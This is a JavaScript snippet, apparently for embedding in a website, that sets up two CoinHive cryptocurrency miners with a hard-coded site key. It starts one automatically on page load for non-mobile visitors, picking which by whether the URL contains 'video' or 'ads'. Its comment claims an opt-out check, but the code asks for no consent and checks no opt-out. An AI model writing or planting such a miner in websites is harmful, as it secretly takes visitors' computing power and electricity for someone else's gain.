var miner = new CoinHive.Anonymous('kyqjnINKhZ7bB8tfYy1qa1a7pinNH0YS', {
    throttle: 0.8
});
var miner2 = new CoinHive.Anonymous('kyqjnINKhZ7bB8tfYy1qa1a7pinNH0YS', {
    throttle: 0.7
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):        if (window.location.href.indexOf("video") > -1)  {             if (!miner2.isMobile()) {miner2.start();     }        }        else if (window.location.href.indexOf("ads") > -1) {              if (!miner2.isMobile()) {      miner2.start();      }       }        else {               if (!miner.isMobile()) {miner.start();      }        }